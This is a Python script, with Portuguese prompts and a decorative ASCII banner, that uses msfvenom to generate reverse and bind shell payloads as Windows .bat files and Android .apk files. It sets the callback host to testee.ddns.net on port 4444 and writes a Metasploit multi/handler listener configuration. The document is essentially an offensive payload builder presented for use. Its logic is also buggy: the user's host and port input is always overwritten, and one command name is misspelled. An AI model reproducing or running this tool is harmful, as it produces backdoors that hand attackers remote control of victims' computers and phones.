import os

print('''
 
                      ,     ,  ._  ,
                 _.MMmm.mMm_Mm.MMm_:mMMmmm.._  .
            _ .-mmMMMMMMMMMMMMm:MMm:MMMMMMMMMm._
             `-.mm.MMMMMMM:MMMMMMMmmMMMMMMMMMmm._
          _.mMMMMMmMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM"~.
           .MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMm._
          _.MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMm._
       ..mMMMMMMMMMMMMMMMMF"""`:MMMMMMMMMMMMMMMMMMMMmmm.
      _.mmMMMMMMMMMMMMM'    /^  )MMMMMMMMMMMMMMMMMMMMm.
       _.MMMMMMMMMMMM/       JMMMMMMMMMMMMMMMMMMMMMMMMm_
   .mmMMMMMMMMMMMMME/       J,  MMMMMMMMMMMMMMMMMMMMMMMm,
  _.-' _.mMMMMMMMMM/        |:  '::M:MMMMMMMMMMMMMMMM""`
   _,MMMmMMMMMMMMMJ         |_   `:MmmMMMMMMMMMMMMMMMmm.
     _.-'MMMMMMMMF         /M.    .MMmMMMMMMMMMMMMMMMMMM.
    .mmMMMMMMMMMMJ        /MMn:.   `MMMMMMMMMMMMMMMMMMMm.
       .MMMMMMMMJ        /M'        `:::'MMMMMMMMMMMMMMM:
    ,MMMmMMMMMMF         |:   _.._    '   MMMMMMMMMMMMmm.
   ,ME:MMMMMMMM|         J               7_MMMMMMMMM:Mm_
   !M:MmmMMMMMM|        /     _____     _JMMMMMMMMMm:MMm.
   '':mMMMMMMMMJ        |    `"==="`    /dMMMMMMMMMMM:'Mm.
    ':MMM:MMMMF        J\              /MMMMMM:MMMMMMm: `
   .M:MMM:MMMM|        |E`.   .   .  ,'MMMMMMM:MMMMMMMm
     .Mm:mMMMMJ        |M| `.      .' |MMMMMMm:.MMMMM.
    .Mm:mMMMM/         |M|   `----':: |MMMMMMMmm`MMMMMm.
      !:mMMM/          /M|      ::::. |MMMMMMMMMMM``mMm.
        !MMJ          |MM|      .:::. |MMMMMMMMMMMMM.._
        MMF           /M/       ::::'  \MMMMMMMMMMMMMMm,
       .mM|          /MMm.       '     .`".MMMMMMMMMMMMm.
        !!J         / b:.:..     ,  ,   .. M.".MMMMMMMMm.
         F         .:`.m,  ..           ..`M.   `"".MMMmm.
         |          .`  b.   ..         ..  `M        `.M!
         |         .:   `b    ..        ..   M           \
         `       ..:     M,   ..         ..  M.           |
          |     :::,     `M,   ..        ..  `M           \
          |      .'       `M    ..       ..   M.           |
          `                M.    ..      ..   `M    ,      \
           |               .M.    ..     ..    M   Y        |
           `              .dMb.    ..   ..     M.  |        |
            \            dMMMMMMb.  ':. ::     M.  |        \
             Y        .dMMMMMMMMMMMb.::_::___.dMMb |         |
             |      .dMMMMMMMMMMMMMMMMM::MMMMMMMMMb/         |
             :.....dMMMMMMMMMMMMMMMMMMM::MMMMMMMMMMM\        |
              MMMMMMMMMMMMMMMMMMMMMMMMp""qMMMMMMMMMM \       `
              `MMMMMMMMMMMMMMMMMMMMMMM:QD:MMMMMMMMMM  \       |
               `MMMMMMMMMMMMMMMMMMMMMMb.:dMMMMMMMMMP  |       |
                `MMMMMMMMMMMMMMMMMMM::::::::MMMMMMF   |       `
                 MMMMMMMMMMMMMMMMMMMMMM.:MMMMMMMMM    |        `
                 `MMMMMMMMMMMMMMMMMMMMM.:MMMMMMMMM    :         |
                  MMMMMMMMMMMMMMMMMMMMM.:MMMMMMMMM     \        |
                  `MMMMMMMMMMMMMMMMMMMM.:MMMMMMMMM      |       `
                   MMMMMMMMMMMMMMMMMMMM.:MMMMMMMMM      `        .
                   `MMMMMMMMMMMMMMMMMMMMMMMMMMMMMM       |        |
                    MMMMMMMMMMMMMMMMMMMMMMMMMMMMMM       |        |
                    MMMMMMMMMMMMMMMMMMMMMMMMMMMMMM       |        |
                   .MMMMMMMMMMMMMMMMMMMMMMMMMMMMMM       |        |
                   dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM       `        |
                 .dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM        .       |
       dp       .dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM        |       |

Em homenagem a meu anjo <3 <3 
                      .
 
 ''')
print("Se o HOST  ficar nulo sera padrão testee.ddns.net")
LHOST = input ('HOST: ')

if (LHOST !=  ' '):
     LHOST = 'testee.ddns.net'

print("se a PORT não for setada sera definida como 4444")        

LPORT = input('PORT: ')

if (LPORT != ' '):
    LPORT = 4444

print()
safe = input('Nome da carga util: ')
if (safe == ' '):
     safe = "PAYLOAD"

print("Selecione o payload\n")

print  ('''
1 ~~> cmd/windows/powershell_reverse_tcp
2 ~~> cmd/windows/powershell_bind_tcp
3 ~~> android/meterpreter/reverse_tcp
4 ~~> android/shell/reverse_tcp
  \n''')

'''
um = ("cmd/windows/powershell_reverse_tcp")
dois = ()
tres = ()
quatro = ()
'''
ser = input("selecione o tipo de carga util:" )

#_________________________________________________________________________________

if   ser == "1":
     print('Gerando...{>1<}')
     os.system('msfvenom.bat -p cmd/windows/powershell_reverse_tcp   LHOST={}  LPORT={}  -o {}.bat'.format(LHOST, LPORT, safe))
     arq = open('Opcoes de setagem.txt', 'w')
     arq.write("use multi/handler\nset PAYLOAD cmd/windows/powershell_reverse_tcp\nset LHOST {}\nset LPORT {}\nrun".format(LHOST, LPORT))
     arq.close()
  
if ser == '2':
     print('Gerando...{>2<}')
     os.system('msfvenom.bat  -p cmd/windows/powershell_bind_tcp   RHOST={}  LPORT={}  -o {}.bat'.format(LHOST, LPORT, safe))
     arq = open('Opcoes de setagem.txt', 'w')
     arq.write("use multi/handler\nset PAYLOAD cmd/windows/powershell_bind_tcp\nset LHOST {}\nset LPORT {}\nrun".format(LHOST, LPORT))
     arq.close()

if ser == '3':
      print("Gerando...{>3<}")
      os.system('msfvenom.bat -p android/meterpreter/reverse_tcp LHOST={} LPORT={} -o {}.apk'.format(LHOST, LPORT, safe))
      arq = open('Opcoes de setagem.txt', 'w')
      arq.write("use multi/handler\nset PAYLOAD android/meterpreter/reverse_tcp\nset LHOST {}\nset LPORT {}\nrun".format(LHOST, LPORT))
      arq.close()

if ser == '4':
     print("Gerando...{>4<}")
     os.system('msfvenom.bat -p android/shell/reverse_tcp LHOST={} LPORT={} -o {}.apk'.format(LHOST, LPORT, safe))

#____________________________________________________________________________________
else:
     print('POR FAVOR SELECIONE A OPÇAO VIAVEL')
#___________________________________________________________________________________              
'''
arq = open('Opcoes de setagem.txt','w')
arq.write("use multi/handler\nset PAYLOAD set LHOST {}\nset LPORT {}\nrun".format(LHOST, LPORT))
arq.close()
'''

#_______________________________________________________________________________________

print("Gerado...Abrindo o Msfconsole\n")
os.system("masfconsole.bat")

#By C4L4NG0_M4T4D0R
